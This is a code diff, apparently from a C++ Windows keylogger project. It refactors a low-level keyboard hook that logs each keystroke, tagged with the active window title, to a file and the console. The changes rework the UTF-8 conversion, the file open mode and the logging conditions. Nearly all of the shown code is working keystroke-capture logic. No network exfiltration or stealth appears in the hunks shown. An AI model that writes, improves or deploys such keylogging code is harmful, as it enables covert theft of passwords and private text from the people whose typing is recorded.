@@ -7,6 +7,7 @@
 #include "config.h"
 #include <ctime>
 #include <cstdlib>
+#include <vector>
 
 #define MY_MAX_PATH 260
 
@@ -18,14 +19,15 @@ static char last_name[MY_MAX_PATH] = {0};
 void writeBOMIfNeeded(const char *filename)
 {
     struct stat buffer;
-    if (stat(filename, &buffer) != 0)
+    if (stat(filename, &buffer) != 0) 
     {
-        std::ofstream file(filename, std::ios::binary);
+        std::ofstream file(filename, std::ios::out | std::ios::binary);
         const unsigned char bom[] = {0xEF, 0xBB, 0xBF};
         file.write(reinterpret_cast<const char *>(bom), 3);
         file.close();
     }
 }
+
 
 void getActiveWindowTitle(char *buffer, int size)
 {
@@ -105,7 +107,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
     {
         PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-        std::ofstream myfile(location, std::ios::app | std::ios::binary);
+        std::ofstream myfile(location, std::ios::app); 
         char name[MY_MAX_PATH] = {0};
         getActiveWindowTitle(name, MY_MAX_PATH);
         if (strncmp(name, last_name, MY_MAX_PATH) != 0)
@@ -144,21 +146,18 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         int result = ToUnicodeEx(p->vkCode, scanCode, keyboardState, wbuf, 4, 0, layout);
         if (result > 0)
         {
-            for (int i = 0; i < result; ++i)
+            std::wstring wstr(wbuf, result);
+            int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
+            if (len > 0)
             {
-                char utf8buf[8] = {0};
-                int len = WideCharToMultiByte(CP_UTF8, 0, &wbuf[i], 1, utf8buf, 8, NULL, NULL);
-                if (len > 0)
-                {
-                    if (logToFile == true)
-                    {
-                        myfile << prefix << std::string(utf8buf, len) << "\n";
-                    }
-                    if (logToConsole == true)
-                    {
-                        std::cout << prefix << std::string(utf8buf, len) << std::endl;
-                    }
-                }
+                std::vector<char> utf8buf(len);
+                WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), utf8buf.data(), len, NULL, NULL);
+                std::string utf8str(utf8buf.begin(), utf8buf.end());
+
+                if (logToFile)
+                    myfile << prefix << utf8str << "\n";
+                if (logToConsole)
+                    std::cout << prefix << utf8str;
             }
         }
         else
